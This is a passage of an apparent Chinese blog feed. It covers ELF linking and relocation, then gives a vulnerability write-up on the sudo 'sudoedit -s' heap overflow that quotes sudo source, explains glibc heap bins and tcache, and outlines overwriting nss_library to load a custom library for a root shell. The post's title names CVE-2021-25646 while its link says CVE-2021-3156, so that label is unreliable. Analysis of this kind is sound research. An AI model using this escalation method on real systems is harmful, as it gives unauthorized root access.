链接器解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。对那些和引用定义在相同模块的局部符号的引用，符号解析是非常简单的。编译器只允许每个模块中每个局部符号有一个定义。静态局部变量也会有本地链接器符号，编译器还要确保它们拥有唯一的名字。</p><p>   然而，对于全局符号的解析要复杂得多。当编译器遇到一个不是在当前模块中定义的符号（变量或函数名）时，会假设该符号是在其他某个模块中定义的，生成一个链接器符号表条目，并把它交给链接器处理。如果链接器在它的任何输入模块中都找不到这个被引用符号的定义，就输出一条错误信息并终止。</p><p>   多重定义的全局符号解析在此不做介绍。</p><p>   <strong>重定位</strong></p><p>   链接的前两步完成之后，链接器就已经确定所有符号的虚拟地址了，那么链接器就可以根据符号的地址对每个需要重定位的指令进行地址修正。</p><p>   那么链接器如何知道哪些指令是要被调整的呢？事实上，我们前面提到的ELF文件中的 <strong>重定位表（Relocation Table）</strong> 专门用来保存这些与重定位相关的信息。</p><p>   对于可重定位的ELF文件来说，它必须包含重定位表，用来描述如何修改相应的节的内容。对于每个要被重定位的ELF节都有一个对应的重定位表。如果<code>.text</code>节需要被重定位，则会有一个相对应叫<code>.rel.text</code>的节保存了代码节的重定位表；如果<code>.data</code>节需要被重定位，则会有一个相对应的<code>.rel.tdata</code>的节保存了数据节的重定位表。</p><p>链接可分为静态链接和动态链接</p><h5 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h5><p>简单来说，静态链接就是在程序加载前，将所依赖的第三方库函数都打包到了一起，形成一个非常大的可执行文件。如下图所示为最基本的静态链接过程示意图。每个模块的源代码文件（如<code>.c</code>）文件经过编译器编译成<strong>目标文件</strong>（Object File，一般扩展名为<code>.o</code>或<code>.obj</code>）。目标文件和 <strong>库（Library）</strong> 一起链接形成最终的可执行文件。其中，最常见的库就是<strong>运行时库（Runtime Library）</strong>，它是支持程序运行的基本函数的集合。<strong>库本质上是一组目标文件的包，由一些最常用的代码编译成目标文件后打包而成</strong>。</p><p><img src="https://i.loli.net/2021/04/10/Cy1xEdQl6TVZqwS.png" alt="linking.jpg"></p><h5 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h5><p>动态链接是在运行时，发现用到某些库中的某些函数时，再从这些第三方库中读取自己所需的方法。</p><p><strong>动态链接的基本实现</strong></p><p>动态链接涉及运行时的链接以及多个文件的装载，必需要有操作系统的支持。因为动态链接的情况下，进程的虚拟地址空间的分布会比静态链接情况下更为复杂，还有一些存储管理、内存共享、进程线程等机制在动态链接下也会有一些微妙的变化。</p><p>目前，主流操作系统都支持动态链接。在Linux中，ELF动态链接文件被称为 <strong>动态共享对象（DSO，Dynamic Shared Objects）</strong>，一般以<code>.so</code>为后缀；在Windows中，动态链接文件被称为 <strong>动态链接库（Dynamic Linking Library）</strong>，一般以<code>.dll</code>为后缀。</p><p>在Linux中，常用的C语言库的运行库glibc，其动态链接形式的版本保留在 <code>/lib</code>目录下，文件名为 <code>libc.so</code>。整个系统只保留一份C语言动态链接文件<code>libc.so</code>，所有的C语言编写的、动态链接的程序都可以在运行时使用它。当程序被装载时，系统的<strong>动态链接器</strong>会将程序所需要的所有动态链接库装载到进程的地址空间，并将程序中所有未解析的符号绑定到相应的动态链接库中，并进行重定位。</p><p><strong>动态链接程序运行时地址空间分布</strong></p><p>对于静态链接的可执行文件来说，整个进程只有一个文件要被映射，即可执行文件。而对于动态链接，除了可执行文件，还有它所依赖的共享目标文件。</p><p>关于共享目标文件在内存中的地址分配，主要有两种解决方案，分别是：</p><ul><li><strong>静态共享库（Static Shared Library）</strong>（地址固定）</li><li><strong>动态共享库（Dynamic Shared Libary）</strong>（地址不固定）</li></ul><p><strong>静态共享库</strong></p><p>静态共享库的做法是将程序的各个模块统一交给操作系统进行管理，操作系统在<strong>某个特定的地址</strong>划分出一些地址块，为那些已知的模块预留足够的空间。因为这个地址对于不同的应用程序来说，都是固定的，所以称之为<strong>静态</strong>。</p><p>但是静态共享库的目标地址会导致地址冲突、升级等问题。</p><p><strong>动态共享库</strong></p><p>采用动态共享库的方式，也称为<strong>装载时重定位（Load Time Relocation）</strong>。其基本思路是：<strong>在链接时，对所有绝对地址的引用都不作重定位，而把这一步推迟到装载时再完成。一旦模块装载地址确定，即目标地址确定，那么系统就对程序中所有的绝对地址引用进行重定位。</strong></p><p>但是这种方式也存在一些问题。比如，动态链接模块被装载映射至虚拟空间后，指令部分是在多个进程间共享的，由于装载时重定位的方法需要修改指令，所以没有办法做到同一份指令被多个进程共享，因为指令被重定位后对于每个进程来说都是不同的。</p><p>然后，动态链接库中的代码是共享的，但是其中的可修改数据部分对于不同进程来说是由多个副本的。基于此，一种名为<strong>地址无关代码</strong>的技术被提出以克服这个问题。</p><p><strong>与地址无关</strong></p><p>无论何种操作系统上，使用动态链接生成的目标文件中凡是涉及第三方库的函数调用都是<strong>地址无关</strong>的。我们自己编写的程序名为hello.c，hello.c中调用了C标准库的<code>printf()</code>，在生成的目标文件中，不会立即确定<code>printf()</code>的具体地址，而是在运行时去装载这个函数，在装载阶段确定<code>printf()</code>的地址。这里提到的地址指的是进程在内存上的虚拟地址。动态链接库的函数地址在编译时是不确定的，在装载时，装载器根据当前地址空间情况，动态地分配一块虚拟地址空间。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在会写一个C程序，也要了解一个C代码是如何从ASCII文件一步步变为可执行文件的过程。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux下Hello-World的前生今世&quot;&gt;&lt;a href=&quot;#Linux下Hello-World的前生今世&quot; class=&quot;headerlink&quot; title=&quot;Linux下Hello World的前生今世&quot;&gt;&lt;/a&gt;Linux下Hello World的前生</summary>
      
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
    <category term="编译过程" scheme="http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"/>
    
    <category term="链接" scheme="http://example.com/tags/%E9%93%BE%E6%8E%A5/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-25646堆溢出漏洞复现及分析</title>
    <link href="http://example.com/2021/04/10/CVE-2021-3156/"/>
    <id>http://example.com/2021/04/10/CVE-2021-3156/</id>
    <published>2021-04-10T03:26:10.677Z</published>
    <updated>2021-04-10T06:32:38.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-25646堆溢出漏洞复现及分析"><a href="#CVE-2021-25646堆溢出漏洞复现及分析" class="headerlink" title="CVE-2021-25646堆溢出漏洞复现及分析"></a>CVE-2021-25646堆溢出漏洞复现及分析</h1><h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>​        当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。</p><p>​    影响范围：</p><p>​    Sudo 1.8.2 - 1.8.31p2</p><p>​    Sudo 1.9.0 - 1.9.5p1</p><h4 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h4><p>​    对于bash而言假如我们希望执行某个命令可以使用<code>bash -c [command]</code>来执行，如果我们希望以root的权限去执行某个命令的话可以直接<code>sudo [cmd]</code>，而如果我们希望以<code>shell</code>模式去执行某个命令的时候，可以使用<code>sudo -i</code>或者<code>sudo -s</code>参数，在参数说明里我们可以看到<code>-i, --login run login shell as the target user; a command may also be specified， -s, --shell run shell as the target user; a command may also be specified</code>，当我们使用上述参数时对于sudo的flags而言有两种情况：</p><ol><li><p>使用<code>sudo -s</code>，设置<code>MO    DE_SHELL</code></p></li><li><p>使用<code>sudo -i</code>，设置<code>MODE_SHELL|MODE_LOGIN_SHELL</code></p><p>​    在<code>src/parse_args.c</code>里我们可以看到对于这种模式的参数处理，处理方式为将参数按照空格拼接起来，对于一些元字符使用反斜线进行转义处理，最终覆写了argv为ac这个指针数组。</p></li></ol><p>​    源码分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * For shell mode we need to rewrite argv</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line"><span class="keyword">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> ac = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* shell -c &quot;command&quot; */</span></span><br><span class="line">    <span class="keyword">char</span> *src, *dst;</span><br><span class="line">        <span class="comment">//得到命令的长度</span></span><br><span class="line">    <span class="keyword">size_t</span> cmnd_size = (<span class="keyword">size_t</span>) (argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) +</span><br><span class="line"><span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmnd == <span class="literal">NULL</span>)</span><br><span class="line">sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!gc_add(GC_PTR, cmnd))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//拼接命令并且处理转移符</span></span><br><span class="line">    <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (src = *av; *src != <span class="string">&#x27;\0&#x27;</span>; src++) &#123;</span><br><span class="line">                <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)*src) &amp;&amp; *src != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;-&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">                    *dst++ = <span class="string">&#x27;\\&#x27;</span>;<span class="comment">//处理转义字符，&#x27;\\&#x27;表示反斜线</span></span><br><span class="line">                *dst++ = *src;</span><br><span class="line">            &#125;</span><br><span class="line">*dst++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cmnd != dst)</span><br><span class="line">    dst--;  <span class="comment">/* replace last space with a NUL */</span></span><br><span class="line">    *dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    ac += <span class="number">2</span>; <span class="comment">/* -c cmnd */</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//上述处理完毕后结果保存在dst指针指向的内存</span></span><br><span class="line">av = reallocarray(<span class="literal">NULL</span>, ac + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">    <span class="comment">//分配新的内存保存拼接的命令</span></span><br><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">    sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (!gc_add(GC_PTR, av))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">av[<span class="number">0</span>] = (<span class="keyword">char</span> *)user_details.shell; <span class="comment">/* plugin may override shell */</span></span><br><span class="line"><span class="keyword">if</span> (cmnd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    av[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    av[<span class="number">2</span>] = cmnd;</span><br><span class="line">&#125;</span><br><span class="line">av[ac] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//最后的形式为 shell -c cmnd(shell和环境变量相关，比如我这里是zsh，shell为/usr/bin/zsh)</span></span><br><span class="line">    <span class="comment">//最终用av覆写argv</span></span><br><span class="line">argv = av;</span><br><span class="line">argc = ac;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        随后在<code>sudoers.c</code>中的<code>sudoers_policy_main</code>函数中调用<code>set_cmnd</code>将命令行参数存放在一个堆上的数据结构<code>user_args</code>中，这里也对元字符做了处理，假如不是<code>\\</code>+<code>space</code>的形式就跳过元字符，否则拷贝到<code>*to</code>。那么假如我们的命令行参数以<code>\\</code>结尾，那么<code>from[0]=&#39;\\&#39;;from[1]=NULL(注意NULL并非sapce范围)</code>，此时from++指向空字符，下面将空字符拷贝到了<code>*to</code>并且<code>from++</code>后执行了NULL后面的字符，此时再次进行while循环判断时很明显这里是可以继续进入循环的(如果后一个字符不为NULL)，从而赋值得以继续进行，从而产生了溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment"> * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment"> * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line"><span class="keyword">while</span> (*from) &#123;</span><br><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">from++;</span><br><span class="line">*to++ = *from++;</span><br><span class="line">&#125;</span><br><span class="line">*to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>set_cmnd()存在越界写，溢出user_args堆缓冲区（size是在852-853行中计算）。根本原因就是，sudo默认 \ 后面肯定跟着元字符，实际上后面只有1个结束符。</strong></p><p>当<code>from</code>指向<code>\</code>时，from[1]指向NULL字节，from[2]指向的就是环境变量的第一个字节了，执行<code>*too=*from++</code>，可以将后面的NULL字节拷贝到<code>user_args</code>的堆中，且让<code>from++</code>，从而避开了<code>while(*from）</code>判断是否读到NULL字节的检测，由于参数后面紧跟环境变量的值，因此通过<strong>设置环境变量的值来覆盖user_args堆后面的数据</strong>。</p><p>​    上述是我们的理论分析，在理论角度上看漏洞是存在的，但是我们在之前的漏洞中也见到过由于无法创造漏洞利用场景(比如我想提权但是exp里需要某个root用户给的capability)，这样的洞就非常鸡肋。那么在我们的分析里有几个理想条件，那么最后的这个场景，即反斜线作为cmd-line的最后一个字符从理论上来说是无法实现的，这里要求我们有<code>MODE_SHELL|MODE_LOGIN_SHELL</code>，而假如flag包含<code>MODE_SHELL</code>的话在我们之前的<code>parse_args</code>参数解析中就会将所有元字符给转义掉，也就是说会有两个反斜线，我们再按照代码走一遍会发现这样循环末尾的<code>*from=NULL</code>，因此会跳出循环。</p><p>​    再仔细对比一下二者的条件，二者的条件略有不同。我们的问题在于能否设置flag为<code>MODE_SHELL</code>以及<code>MODE_RUN</code>或者<code>MODE_EDIT</code>或者<code>MODE_CHECK</code>。</p><p>​    再看下解析参数的部分会发现好像还是不太行，假如我们使用<code>-e</code>参数设置<code>MODE_EDIT</code>或者使用<code>-l</code>参数设置<code>MODE_CHECK</code>，我们的<code>MODE_SHELL</code>参数就会被从<code>valid_flags</code>去掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bug condition</span></span><br><span class="line"><span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; </span><br><span class="line">            <span class="comment">//... </span></span><br><span class="line">           <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; </span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//escape meta char condition</span></span><br><span class="line"><span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line">    <span class="comment">//.. </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODE_NONINTERACTIVE0x00800000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODE_SHELL0x00020000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//parse_args.c</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (mode &amp;&amp; mode != MODE_EDIT)</span><br><span class="line">usage_excl(<span class="number">1</span>);</span><br><span class="line">    mode = MODE_EDIT;</span><br><span class="line">    sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    valid_flags = MODE_NONINTERACTIVE;<span class="comment">//这里</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (mode) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == MODE_LIST)</span><br><span class="line">    SET(flags, MODE_LONG_LIST);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    usage_excl(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mode = MODE_LIST;</span><br><span class="line">    valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;<span class="comment">//这里</span></span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; valid_flags) != flags)</span><br><span class="line">usage(<span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    最后作者发现了一个可以利用的地方(盲猜是通过全局搜flag找到的)，那就是如果我们去执行sudoedit，<code>parse_args</code>函数会自动设置<code>MODE_EDIT</code>，并且不会重置<code>valid_flags</code>，而<code>valid_flags</code>默认包含了<code>MODE_SHELL</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Default flags allowed when running a command.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_VALID_FLAGS(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> valid_flags = DEFAULT_VALID_FLAGS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First, check to see if we were invoked as &quot;sudoedit&quot;. */</span></span><br><span class="line">    proglen = <span class="built_in">strlen</span>(progname);</span><br><span class="line">    <span class="keyword">if</span> (proglen &gt; <span class="number">4</span> &amp;&amp; <span class="built_in">strcmp</span>(progname + proglen - <span class="number">4</span>, <span class="string">&quot;edit&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">progname = <span class="string">&quot;sudoedit&quot;</span>;</span><br><span class="line">mode = MODE_EDIT;</span><br><span class="line">sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    也就是说，加入我们执行<code>sudoedit -s</code>，就同时兼具了<code>MODE_SHELL|MODE_EDIT</code>而没有<code>MODE_RUN</code>，因此可以成功到达漏洞点。</p><p>一个溢出demo：</p><p><img src="https://i.loli.net/2021/04/10/w1pmGBidMAHYjhu.png" alt="溢出demo.png"></p><h5 id="1-堆溢出分析"><a href="#1-堆溢出分析" class="headerlink" title="1.堆溢出分析"></a>1.堆溢出分析</h5><p>1.堆在内存中的位置</p><p><img src="https://i.loli.net/2021/04/10/Q7CPNX43tiMVxWp.png" alt="堆的位置分布.png"></p><h5 id="2-堆的结构"><a href="#2-堆的结构" class="headerlink" title="2.堆的结构"></a>2.堆的结构</h5><p><img src="https://i.loli.net/2021/04/10/6938X7Ay4h2qOlR.png" alt="堆区结构.png"></p><p>arena：通过sbrk或mmap系统调用为线程分配的堆区，按线程的类型可以分为2类：</p><pre><code>main arena：主线程建立的arena；thread arena：子线程建立的arena；</code></pre><p>bin：一个用以保存Free chunk链表的表头信息的指针数组，按所悬挂链表的类型可以分为4类:</p><pre><code>Fast bin：Fast bin 共有10个，存储了chunk size 从16到80的free chunk，这些free chunk被称作fast chunkUnsorted bin：当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。Small bin：小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。Large bin：大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。</code></pre><p><img src="https://i.loli.net/2021/04/10/6XPgJO3GtnYodEf.png" alt="bins分类.png"></p><p><img src="https://i.loli.net/2021/04/10/oXgKMUD1Lc67Ybz.png" alt="fast_bin.png"></p><p><strong>PS:libc2.26 之后的 Tcache 机制</strong></p><p>Tcache bin :类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找。</p><p>区别：<strong>Max fast bins size is 0x80. Max tcache bins size is 0x410</strong></p><p><img src="https://i.loli.net/2021/04/10/heQiJqHdXUj9krF.png" alt="多线程共享堆区.png"></p><p>mutex：互斥锁，防止多线程对chunk资源的竞争</p><p><img src="https://i.loli.net/2021/04/10/odku3e8Mgavx4bB.png" alt="直观结构.png"></p><p>Large bin：</p><p><img src="https://i.loli.net/2021/04/10/eLkBGIz7Ah5E1gO.png" alt="largebin.png"></p><p>chunk：逻辑上划分的一小块内存，根据作用不同分为4类：</p><pre><code>Allocated chunk：即分配给用户且未释放的内存块；Free chunk：即用户已经释放的内存块；Top chunk：处于一个arena的最顶部的chunkLast Remainder chunk：对small bin的malloc机制的介绍中当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk。</code></pre><p>标志位：</p><p>A:记录当前chunk是否属于主线程</p><p>M:记录当前chunk是否是由mmap分配</p><p>P:记录前一个chunk块是否被分配</p><p><img src="https://i.loli.net/2021/04/10/VXnM5lwBWHrhxIe.png" alt="chunk结构.png"></p><p><strong>Malloc Algorithm：</strong></p><p><strong>1.若malloc请求大小与tcache中某个chunk大小完全匹配，优先从tcache bins调用而不必向large bin发出请求。</strong></p><p>2.若请求内存足够大，则调用mmap()直接向操作系统从内存中调用</p><p>3.若fast bin中有合适大小的块，则先从中分配</p><p>TO  be continued….</p><p><strong>Free Algorithm：</strong></p><p><strong>1.若tcache bins有空间，则优先将空闲块放入其中</strong></p><p>2.如果块足够小，则优先放入fast bins中</p><p>TO  be continued….</p><p>从该调度算法可以看出，某个具体大小的chunk可以在tcache bins 中稳定存在一定时间并且不发生合并，这个机制可以为我们精准溢出到某个结构体前面附近提前进行占位。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>思路：利用溢出覆写<code>nss_library</code>为<code>X/X</code>，从而加载自定义的库函数，进而get root shell。</p><p>知识背景：</p><h5 id="1-glibc-setlocale"><a href="#1-glibc-setlocale" class="headerlink" title="1.glibc setlocale"></a>1.glibc setlocale</h5><p><strong>main()函数较早调用了setlocale()函数，查阅源码我们发现此处进行了malloc操作，这样可以分配并释放几个LC环境变量（LC_CTYPE，LC_MESSAGES，LC_TIME等），这样就在Sudo的堆开头处留下了空闲的fast/tcache chunks</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /src/sudo.c</span></span><br><span class="line"><span class="number">150</span>:    <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function">151:    </span>&#123;</span><br><span class="line">        ...</span><br><span class="line"><span class="number">171</span>:    setlocale(LC_ALL, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        ...</span><br><span class="line"><span class="number">216</span>:    sudo_mode = parse_args(argc, argv, &amp;submit_optind, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/10/ZYQbr8e5tGUBqs9.png" alt="setlocale.png"></p><p><img src="https://i.loli.net/2021/04/10/5GCNfYP38zbSrFk.png" alt="setlocaleA.png"></p><p><strong>总之我们可以通过设置环境变量对堆进行修饰，得到指定大小的空闲chunk 并且该块在NSS结构体之前。由malloc机制不难分析出，我们控制好溢出大小很容易在tcache或者fast bins中占有该空闲块。</strong></p><h5 id="2-NSS（Name-Service-Switch）"><a href="#2-NSS（Name-Service-Switch）" class="headerlink" title="2.NSS（Name Service Switch）"></a>2.NSS（Name Service Switch）</h5><p>​    每个Linux/Unix的操作系统中都有这样的一套称之为NSS的共享库来做一些解析，比如登录用户的用户名以及IP地址到域名的解析。比如对于DNS服务来说，它默认查看<code>/etc/resolv.conf</code>配置文件的内容进行解析，对于用户和组来说，它会默认查看<code>/etc/passwd</code>和<code>/etc/group</code>。其配置文件位于<code>/etc/nsswitch.conf</code>，其每行都规定了查找方法的规范，在GNU C Library里, <strong>每个可用的SERVICE都必须有文件 <code>/lib/libnss_SERVICE.so.1</code> 与之对应。<em>**</em></strong>也就是说，GNU将每个服务实现为不同的module(shared library)，因此可以在Linux系统中找到下列相应的共享库。**</p><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 